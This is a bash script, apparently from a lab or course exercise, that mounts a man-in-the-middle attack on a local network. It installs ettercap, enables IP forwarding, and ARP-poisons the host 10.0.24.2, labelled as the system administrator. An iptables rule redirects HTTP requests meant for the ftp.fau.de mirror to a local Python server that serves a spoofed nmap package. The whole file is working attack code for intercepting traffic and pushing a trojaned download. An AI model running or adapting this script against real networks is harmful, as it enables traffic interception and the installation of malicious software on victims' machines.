#!/bin/bash

main() {
    install_requirements
    enable_ip_forwarding
    check_ip_forwarding
    forward_http
    # call the serve_http function and send it to background in order to call the arp poison function
    serve_http &
    arp_poison
    clean
}

# install the needed requirements
install_requirements() {
    echo "[*] The following packages will be installed:"
    echo "    ettercap-text-only"
    echo "    python3"
    echo "    iptables"
    apt-get -qq install -y ettercap-text-only python3 iptables > /dev/null
}

# enable ip forwarding in order to be able to act as the router
enable_ip_forwarding() {
    echo "[*] Enabling IP forwarding..."
    sysctl -w net.ipv4.ip_forward=1 > /dev/null
}

# check if ip forwarding was successfully enabled
check_ip_forwarding() {
    echo "[*] Checking if IP forwarding was successfully enabled..."
    # save the content of the file ip_forward file into the variable ip_forwarding
    ip_forwarding=`cat /proc/sys/net/ipv4/ip_forward`

    # check if the content of the file ip_forward is equal to the string "1"
    if [ $ip_forwarding = "1" ]; then
        echo "[+] IP forwarding was successfully enabled."
    else
        echo "[-] IP forwarding was not enabled. Exiting..."
        exit 0
    fi
}

forward_http() {
    # redirect all HTTP traffic intended for ftp.fau.de (131.188.12.211) to localhost on port 1337
    echo "[*] Configuring iptables in order to redirect HTTP traffic intended for ftp.fau.de..."
    iptables -t nat -I PREROUTING -d 131.188.12.211 -p tcp --dport 80 -j REDIRECT --to-port 1337
}

arp_poison() {
    # arp poison 10.0.24.2 (system administrator) and act as a router (10.0.24.1) (supposed that primary network interface is called eth0)
    ettercap -Tq -i eth0 -M arp //10.0.24.2/ //10.0.24.1/ > /dev/null
}

serve_http() {
    # serve HTTP requests on port 1337 and specify an alternative directory, namely ftp.fau.de (spoofed nmap package is located here)
    python3 -m http.server -d ftp.fau.de 1337
}

clean() {
    echo "[*] Cleaning..."

    echo "    Removing iptable entry..."
    # remove the previously inserted iptables entry
    iptables -t nat -D PREROUTING -d 131.188.12.211 -p tcp --dport 80 -j REDIRECT --to-port 1337
}

main
